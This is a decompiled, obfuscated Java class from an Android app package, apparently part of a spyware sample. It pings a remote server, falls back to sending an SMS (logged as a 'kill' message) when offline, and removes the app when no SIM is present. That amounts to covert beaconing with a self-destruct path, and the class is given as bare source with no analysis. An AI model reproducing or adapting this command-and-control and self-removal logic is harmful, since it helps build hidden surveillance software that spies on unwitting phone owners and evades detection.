package com.network.android.a;

import android.content.Context;
import android.telephony.TelephonyManager;
import com.network.android.c.a.a;
import com.network.h.b;

final class j implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f51a;

    j(Context context) {
        this.f51a = context;
    }

    public final void run() {
        try {
            a.a("http First Last Ping");
            if (!com.network.android.j.e(this.f51a)) {
                a.a("http First Last Ping no internet");
                if (!c.i) {
                    return;
                }
                if (((TelephonyManager) this.f51a.getSystemService("phone")).getSubscriberId() != null) {
                    a.a("ping SMS httpFirstLastPing not on line send sms mo kill");
                    c.b(this.f51a, 5);
                    return;
                }
                a.a("removeAppalication with no sim");
                b.a(this.f51a);
                return;
            }
            c.a(this.f51a, 0);
        } catch (Throwable th) {
            a.a("httpFirstLastPing" + th.getMessage(), th);
        }
    }
}
